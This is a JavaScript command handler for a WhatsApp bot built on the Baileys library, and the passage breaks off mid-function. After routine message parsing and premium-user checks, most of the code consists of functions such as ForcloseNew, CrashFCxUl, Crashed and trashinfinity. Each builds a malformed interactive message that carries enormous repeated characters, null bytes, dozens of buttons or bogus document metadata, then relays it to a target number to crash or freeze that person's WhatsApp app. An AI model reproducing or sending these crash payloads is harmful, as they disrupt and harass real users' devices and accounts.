
//=======================
//Modul
require("./config");
const { 
default: baileys, 
downloadContentFromMessage,
proto, 
generateWAMessage, 
generateWAMessageFromContent, 
getContentType, 
prepareWAMessageMedia
} = require("@whiskeysockets/baileys");
const path = require('path');
const fs = require("fs");
const util = require("util")
const chalk = require("chalk");
const crypto = require("crypto");
const { spawn, exec } = require("child_process");
const { performance } = require("perf_hooks");
const { addPremiumUser, checkPremiumUser, getAllPremiumUser } = require("./lib/premiun");
const { generateMessageTag, jsonformat, generateProfilePicture, getGroupAdmins, getBuffer, getSizeMedia, fetchJson, sleep, isUrl, runtime } = require('./lib/myfunction');
const moment = require("moment-timezone");
const { execSync } = require('child_process')
//===========================≥
//Store
module.exports = async (conn, m, chatUpdate, store) => {
try {
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "messageContextInfo" ?
m.message.buttonsResponseMessage?.selectedButtonId ||
m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||
m.text : ""
);
//===========================≥
//string
const { groupMembers } = m
var budy = (typeof m.text == "string" ? m.text : "")
const prefixRegex = /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/;
const botNumber = await conn.decodeJid(conn.user.id)
var prefix = ""; //SILA UBAH PREFIX SESUAI KEINGINAN
var isCmd = body.startsWith(prefix);
var command = isCmd
? body.slice(prefix.length).trim().split(/ +/).shift().toLowerCase()
: "";
const content = JSON.stringify(m.message)
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const text = q = args.join(" ")//hard
const fatkuns = (m.quoted || m)
const quoted = (fatkuns.mtype == "buttonsMessage") ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == "templateMessage") ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == "product") ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ""
const qmsg = (quoted.msg || quoted)
const isMedia = /image|video|sticker|audio/.test(mime)
//===========================≥
//User
const numberQuery = text.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net"
const mentionByTag = m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
const mentionByReply = m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || "" : ""
const Inputo = mentionByTag[0] ? mentionByTag[0] : mentionByReply ? mentionByReply : q ? numberQuery : false
const from = m.key.remoteJid
const itsMe = m.sender == botNumber ? true : false
const orgkaya = JSON.parse(fs.readFileSync("./system/database/premium.json"))
const kontributor = JSON.parse(fs.readFileSync("./system/database/owner.json"))
const isCreator = [botNumber, ...kontributor, ...global.owner].map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender)
const isDeveloper = [botNumber].map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender)
const isPremium = isDeveloper || isCreator || checkPremiumUser(m.sender, orgkaya);
const axios = require('axios');
//===========================≥
// Group
const groupMetadata = m.chat.endsWith("@g.us") ? (await conn.groupMetadata(m.chat).catch(e => {})) : {}
const participants = Object.keys(groupMetadata).length > 0 ? groupMetadata.participants : ""
const groupAdmins = Object.keys(groupMetadata).length > 0 ? (await getGroupAdmins(participants)) : ""
const isBotAdmins = Object.keys(groupMetadata).length > 0 ? groupAdmins.includes(botNumber) : false
const isAdmins = Object.keys(groupMetadata).length > 0 ? groupAdmins.includes(m.sender) : false
const groupName = m.isGroup ? groupMetadata.subject : "";
const isGroup = m.chat.endsWith("@g.us")
const groupOwner = Object.keys(groupMetadata).length > 0 ? groupMetadata.owner : ""
const isGroupOwner = Object.keys(groupMetadata).length > 0 ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
const qlocJpm = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `RikzzZhiro`,jpegThumbnail: ""}}}
//===========================≥
//Status
try {
const isNumber = (x) => typeof x === "number" && !isNaN(x);
if (typeof global.db.users[m.sender] !== "object") global.db.users[m.sender] = { premiumTime: 0, name: m.pushName || "No Name", premium: false };
else {
const user = global.db.users[m.sender];
user.premiumTime = user.premiumTime || 0;
user.premium = user.premium || false;
}
if (typeof global.db.chats[m.chat] !== "object") global.db.chats[m.chat] = {};
const defaultSettings = { status: 0, stock: 10, public: false };
const setting = global.db.settings[botNumber] || {};
global.db.settings[botNumber] = { ...defaultSettings, ...setting };
if (!isNumber(global.db.settings[botNumber].status)) global.db.settings[botNumber].status = 0;
} catch (err) {}
if (!global.db.settings[botNumber].public && !isCreator) return;
//===========================≥
//cmd & reac
const commandLog = [
chalk.keyword("red")(`[ PESAN ]`),
chalk.whiteBright(`${m.body || m.mtype}`),
chalk.greenBright("Dari"),
chalk.yellow(m.pushName)
];
if (isGroup) {
commandLog.push(chalk.greenBright("in"));
commandLog.push(chalk.yellow(groupName));
}
console.log(`${commandLog.join(' ')}`);
const reaction = async (jidss, emoji) => {
conn.sendMessage(jidss, {
react: {
text: emoji,
key: m.key
}
})
}
const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
let ucapanWaktu
if (time >= "19:00:00" && time < "23:59:00") {
ucapanWaktu = "🌃𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐌𝐚𝐥𝐚𝐦"
} else if (time >= "15:00:00" && time < "19:00:00") {
    ucapanWaktu = "🌄𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐨𝐫𝐞"
} else if (time >= "11:00:00" && time < "15:00:00") {
ucapanWaktu = "🏞️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐢𝐚𝐧𝐠"
} else if (time >= "06:00:00" && time < "11:00:00") {
    ucapanWaktu = "🏙️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐏𝐚𝐠𝐢"
} else {
    ucapanWaktu = "🌆𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐮𝐛𝐮𝐡"
};
//=============================//
//=========================≥
const rikzz = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(from ? {
remoteJid: "@s.whatsapp.net"
} : {})
},
"message": {
"orderMessage": {
"orderId": "594071395007984",
"itemCount": 999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `ᴄᴏᴍᴍᴀɴᴅ: ${prefix + command}`,
"orderTitle": "Kontol",
"sellerJid": "601118979616@s.whatsapp.net",
"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
"totalAmount1000": "500000000000",
"totalCurrencyCode": "IDR"
}
}
}
//Image
const zconcept = "https://files.catbox.moe/v2yrxf.jpg"
const images = [
			"https://files.catbox.moe/ko03m2.jpg",
			"https://od.lk/s/NzNfOTY3MDQ0NTlf/Picsart_25-06-07_10-17-31-443.png",
			"https://od.lk/s/NzNfOTY3MDQ0NTlf/Picsart_25-06-07_10-17-31-443.png",
			"https://od.lk/s/NzNfOTY3MDQ0NTlf/Picsart_25-06-07_10-17-31-443.png",
			"https://od.lk/s/NzNfOTY3MDQ0NTlf/Picsart_25-06-07_10-17-31-443.png",
			"https://od.lk/s/NzNfOTY3MDQ0NTlf/Picsart_25-06-07_10-17-31-443.png",
			"https://od.lk/s/NzNfOTY3MDQ0NTlf/Picsart_25-06-07_10-17-31-443.png",
			"https://od.lk/s/NzNfOTY3MDQ0NTlf/Picsart_25-06-07_10-17-31-443.png",
			"https://od.lk/s/NzNfOTY3MDQ0NTlf/Picsart_25-06-07_10-17-31-443.png",
			"https://od.lk/s/NzNfOTY3MDQ0NTlf/Picsart_25-06-07_10-17-31-443.png"
		];

		function getRandomImage() {
			const randomIndex = Math.floor(Math.random() * images.length);
			return images[randomIndex];
		}
		const thumbSky = getRandomImage()
//=========================≥
//FUNCTION UI
async function fcGroups(target) {
  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
          contextInfo: {
          expiration: 1,
          ephemeralSettingTimestamp: 1,
          entryPointConversionSource: "WhatsApp.com",
          entryPointConversionApp: "WhatsApp",
          entryPointConversionDelaySeconds: 1,
          disappearingMode: {
            initiatorDeviceJid: target,
            initiator: "INITIATED_BY_OTHER",
            trigger: "UNKNOWN_GROUPS"
          },
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [target],
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: null
              }
            },
            externalAdReply: {
              showAdAttribution: true,
              renderLargerThumbnail: true
            }
          },
            body: {
              text: "⾼ \`𝐎𝐁𝐋𝐈𝐕𝐈𝐎𝐍𝐗 - 友 | —͟͞͞𝙍𝙞𝙠𝙯𝙯𝙕𝙝𝙞𝙧𝙤 ᝄ \`",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({
                     status: true,
                     criador: "⾼ \`𝐎𝐁𝐋𝐈𝐕𝐈𝐎𝐍𝐗 - 友 | —͟͞͞𝙍𝙞𝙠𝙯𝙯𝙕𝙝𝙞𝙧𝙤 ᝄ \`",
                     versao: "@latest",
                     atualizado: "2025-04-15",
                     suporte: "https://wa.me/6283890875133",
                     comandosDisponiveis: [`${command}`],
                     prefixo: `${prefix}`,
                     linguagem: "id"
                  }) + "⾼ \`𝐎𝐁𝐋𝐈𝐕𝐈𝐎𝐍𝐗 - 友 | —͟͞͞𝙍𝙞𝙠𝙯𝙯𝙕𝙝𝙞𝙧𝙤 ᝄ \`"
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({ 
                  status: true,
                     criador: "⾼ \`𝐎𝐁𝐋𝐈𝐕𝐈𝐎𝐍𝐗 - 友 | —͟͞͞𝙍𝙞𝙠𝙯𝙯𝙕𝙝𝙞𝙧𝙤 ᝄ \`",
                     versao: "@latest",
                     atualizado: "2025-04-15",
                     suporte: "https://wa.me/6283890875133",
                     comandosDisponiveis: [`${command}`],
                     prefixo: `${prefix}`,
                     linguagem: "id"
                  }) + "⾼ \`𝐎𝐁𝐋𝐈𝐕𝐈𝐎𝐍𝐗 - 友 | —͟͞͞𝙍𝙞𝙠𝙯𝙯𝙕𝙝𝙞𝙧𝙤 ᝄ \`"
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await conn.relayMessage(target, msg.message, {
    messageId: msg.key.id
  });
}
async function XFlowButton(target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 1,
          },
          interactiveMessage: {
            contextInfo: {
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              participant: target,
              isForwarded: true,
              forwardingScore: 999,
              forwardedNewsletterMessageInfo: {
                newsletterJid: `33333333333333333@newsletter`,
                newsletterName: "友 | —͟͞͞𝙍𝙞𝙠𝙯𝙯𝙕𝙝𝙞𝙧𝙤",
                businessOwnerJid: target,
              },
            },
            body: {
              text: "𝗡𝗶𝗸𝗮𝗩𝗲𝗿𝘀𝗶𝗼𝗻𝟱𝗳",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "galaxy_message",
                  paramsJson: {
                    screen_2_OptIn_0: true,
                    screen_2_OptIn_1: true,
                    screen_1_Dropdown_0: "nullOnTop",
                    screen_1_DatePicker_1: "1028995200000",
                    screen_1_TextInput_2: "null@gmail.com",
                    screen_1_TextInput_3: "94643116",
                    screen_0_TextInput_0: "\u0000".repeat(500000),
                    screen_0_TextInput_1: "SecretDocu",
                    screen_0_Dropdown_2: "#926-Xnull",
                    screen_0_RadioButtonsGroup_3: "0_true",
                    flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                  },
                },
              ],
            },
          },
        },
      },
    };

    await conn.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (err) {
    console.log(err);
  }
}
async function ForcloseNew(target) {
    console.log(`[LOG] ${target}`);

    let venomModsData = JSON.stringify({
        status: true,
        criador: "VenomMods",
        resultado: {
            type: "md",
            ws: {
                _events: { "CB:ib,,dirty": ["Array"] },
                _eventsCount: 800000,
                _maxListeners: 0,
                url: "wss://web.whatsapp.com/ws/chat",
                config: {
                    version: ["Array"],
                    browser: ["Array"],
                    waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                    depayyCectTimeoutMs: 20000,
                    keepAliveIntervalMs: 30000,
                    logger: {},
                    printQRInTerminal: false,
                    emitOwnEvents: true,
                    defaultQueryTimeoutMs: 60000,
                    customUploadHosts: [],
                    retryRequestDelayMs: 250,
                    maxMsgRetryCount: 5,
                    fireInitQueries: true,
                    auth: { Object: "authData" },
                    markOnlineOndepayyCect: true,
                    syncFullHistory: true,
                    linkPreviewImageThumbnailWidth: 192,
                    transactionOpts: { Object: "transactionOptsData" },
                    generateHighQualityLinkPreview: false,
                    options: {},
                    appStateMacVerification: { Object: "appStateMacData" },
                    mobile: true
                }
            }
        }
    });

    let stanza = [
        { attrs: { biz_bot: "1" }, tag: "bot" },
        { attrs: {}, tag: "biz" }
    ];

    let message = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 3.2,
                    isStatusBroadcast: true,
                    statusBroadcastJid: "status@broadcast",
                    badgeChat: { unreadCount: 9999 }
                },
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "proto@newsletter",
                    serverMessageId: 1,
                    newsletterName: `友 | —͟͞͞𝙍𝙞𝙠𝙯𝙯𝙕𝙝𝙞𝙧𝙤      - 〽${"ꥈㅤㅤꥈ".repeat(10)}`,
                    contentType: 3,
                    accessibilityText: `友 | —͟͞͞𝙍𝙞𝙠𝙯𝙯𝙕𝙝𝙞𝙧𝙤********************************""""" ${"﹏".repeat(102002)}`,
                },
                interactiveMessage: {
                    contextInfo: {
                        businessMessageForwardInfo: { businessOwnerJid: target },
                        dataSharingContext: { showMmDisclosure: true },
                        participant: "0@s.whatsapp.net",
                        mentionedJid: ["13135550002@s.whatsapp.net"],
                    },
                    body: {
                        text: "\u0003" + "Hi darling?".repeat(102002) + "\u0003".repeat(102002)
                    },
                    nativeFlowMessage: {
                        buttons: [
                            { name: "single_select", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "payment_method", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "call_permission_request", buttonParamsJson: venomModsData + "\u0003".repeat(9999), voice_call: "call_galaxy" },
                            { name: "form_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "wa_payment_learn_more", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "wa_payment_transaction_details", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "wa_payment_fbpin_reset", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "catalog_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "payment_info", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "review_order", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "send_location", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "payments_care_csat", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "view_product", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "payment_settings", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "address_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "automated_greeting_message_view_catalog", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "open_webview", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "message_with_link_status", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "payment_status", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "galaxy_costum", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "extensions_message_v2", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "landline_call", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "mpm", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "cta_copy", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "cta_url", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "review_and_pay", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "galaxy_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "cta_call", buttonParamsJson: venomModsData + "\u0003".repeat(9999) }
                        ]
                    }
                }
            }
        },
        additionalNodes: stanza,
        stanzaId: `stanza_${Date.now()}`
    };

    await conn.relayMessage(target, message, { participant: { jid: target } });
    console.log(`[SUCCESS] ${target}`);
}
async function CrashFCxUl(target) {
    console.log(`[LOG] ${target}`);

    let venomModsData = JSON.stringify({
        status: true,
        criador: "VenomMods",
        resultado: {
            type: "md",
            ws: {
                _events: { "CB:ib,,dirty": ["Array"] },
                _eventsCount: 800000,
                _maxListeners: 0,
                url: "wss://web.whatsapp.com/ws/chat",
                config: {
                    version: ["Array"],
                    browser: ["Array"],
                    waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                    depayyCectTimeoutMs: 20000,
                    keepAliveIntervalMs: 30000,
                    logger: {},
                    printQRInTerminal: false,
                    emitOwnEvents: true,
                    defaultQueryTimeoutMs: 60000,
                    customUploadHosts: [],
                    retryRequestDelayMs: 250,
                    maxMsgRetryCount: 5,
                    fireInitQueries: true,
                    auth: { Object: "authData" },
                    markOnlineOndepayyCect: true,
                    syncFullHistory: true,
                    linkPreviewImageThumbnailWidth: 192,
                    transactionOpts: { Object: "transactionOptsData" },
                    generateHighQualityLinkPreview: false,
                    options: {},
                    appStateMacVerification: { Object: "appStateMacData" },
                    mobile: true
                }
            }
        }
    });

    let stanza = [
        { attrs: { biz_bot: "1" }, tag: "bot" },
        { attrs: {}, tag: "biz" }
    ];

    let message = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 3.2,
                    isStatusBroadcast: true,
                    statusBroadcastJid: "status@broadcast",
                    badgeChat: { unreadCount: 9999 }
                },
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "proto@newsletter",
                    serverMessageId: 1,
                    newsletterName: `友 | —͟͞͞𝙍𝙞𝙠𝙯𝙯𝙕𝙝𝙞𝙧𝙤𖣂      - 〽${"ꥈㅤㅤꥈ".repeat(10)}`,
                    contentType: 3,
                    accessibilityText: `友 | —͟͞͞𝙍𝙞𝙠𝙯𝙯𝙕𝙝𝙞𝙧𝙤********************************""""" ${"﹏".repeat(102002)}`,
                },
                interactiveMessage: {
                    contextInfo: {
                        businessMessageForwardInfo: { businessOwnerJid: target },
                        dataSharingContext: { showMmDisclosure: true },
                        participant: "0@s.whatsapp.net",
                        mentionedJid: ["13135550002@s.whatsapp.net"],
                    },
                    body: {
                        text: "\u0003" + "ꦾ".repeat(102002) + "\u0003".repeat(102002)
                    },
                    nativeFlowMessage: {
                        buttons: [
                            { name: "single_select", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "payment_method", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "call_permission_request", buttonParamsJson: venomModsData + "\u0003".repeat(9999), voice_call: "call_galaxy" },
                            { name: "form_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "wa_payment_learn_more", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "wa_payment_transaction_details", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "wa_payment_fbpin_reset", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "catalog_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "payment_info", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "review_order", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "send_location", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "payments_care_csat", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "view_product", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "payment_settings", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "address_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "automated_greeting_message_view_catalog", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "open_webview", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "message_with_link_status", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "payment_status", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "galaxy_costum", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "extensions_message_v2", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "landline_call", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "mpm", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "cta_copy", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "cta_url", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "review_and_pay", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "galaxy_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "cta_call", buttonParamsJson: venomModsData + "\u0003".repeat(9999) }
                        ]
                    }
                }
            }
        },
        additionalNodes: stanza,
        stanzaId: `stanza_${Date.now()}`
    };

    await conn.relayMessage(target, message, { participant: { jid: target } });
    console.log(`[SUCCESS] ${target}`);
}
async function nativemessage(target) {
conn.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                fileName: "友 | —͟͞͞𝙍𝙞𝙠𝙯𝙯𝙕𝙝𝙞𝙧𝙤",
                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1726867151",
                contactVcard: true,
                jpegThumbnail: conn,
              },
              hasMediaAttachment: true,
              },
              body: {
                text:
                  "友 | —͟͞͞𝙍𝙞𝙠𝙯𝙯𝙕𝙝𝙞𝙧𝙤⭑̤\n" +
                  "ꦾ".repeat(10000) +
                  `@1`.repeat(10000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                ],
                groupMentions: [
                  {
                    groupJid: "1@newsletter",
                    groupSubject: "Vamp",
                  },
                ],
                                  nativeFlowMessage: {
                        buttons: [
                            {
                                name: "call_permission_request",
                                buttonParamsJson: {}
                            }
                        ]
                    },  
                quotedMessage: {
                locationMessage: {
                  degreesLatitude: 1.0,
                  degreesLongitude: 5.0,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    )
    }
async function CrashJids(target) {
  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "review_order",
            buttonParamsJson: {
              reference_id: Math.random().toString(11).substring(2, 10).toUpperCase(),
              order: {
                status: "completed",
                order_type: "ORDER"
              },
              share_payment_status: true
            }
          }
        ],
        messageParamsJson: {}
      }
   }
  }, { userJid: target });

  await conn.relayMessage(target, msg.message, { 
    messageId: msg.key.id 
  });
}
async function Crashed(target) {
conn.relayMessage(
target,
{
interactiveMessage: {
header: {
title: "⃟🩸𝗥𝗜𝗞𝗭𝗭 𝗭𝗛𝗜𝗥𝗢̈́ 🦠⃟   ",
hasMediaAttachment: false
},
body: {
text: "\nꦾ".repeat(155555)
},
nativeFlowMessage: {
messageParamsJson: "",
buttons: [{
name: "single_select",
buttonParamsJson: "z"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},

]
}
}						
},
{ participant: { jid: target } }
);
}
async function trashinfinity(target) {
 let virtex = "ԱӀ ԲՕՐ ձլէչչ💣";
   conn.relayMessage(target, {
     groupMentionedMessage: {
       message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "99999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: virtex,
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "ԱӀ ԲՕՐ ձլէչչ" + "ꦾ".repeat(100000) + "@1".repeat(300000)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "𝙏𝙝𝙖𝙣" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        };
async function FloodsCarousel(isTarget, Ptcp = true) {
const header = {
locationMessage: {
degreesLatitude: 0,
degreesLongitude: 0,
},
hasMediaAttachment: true,
};
const body = {
text: "404 - 友 | —͟͞͞𝙍𝙞𝙠𝙯𝙯𝙕𝙝𝙞𝙧𝙤🐉" + "᭯".repeat(90000),
};
const carouselMessage = {
sections: [
{
title: "\u200C".repeat(90000),
rows: [
{ title: "\u200D".repeat(90000), description: "\u200D".repeat(90000), rowId: "\u200D".repeat(90000) },
{ title: "\u200D".repeat(90000), description: "\u200D".repeat(90000), rowId: "\u200D".repeat(90000) },
],
},
{
title: "\u200c".repeat(90000),
rows: [
{ title: "\u200D".repeat(90000), description: "\u200D".repeat(90000), rowId: "\u200D".repeat(90000) },
{ title: "\u200D".repeat(90000), description: "\u200D".repeat(90000), rowId: "\u200D".repeat(90000) },
],
},
{
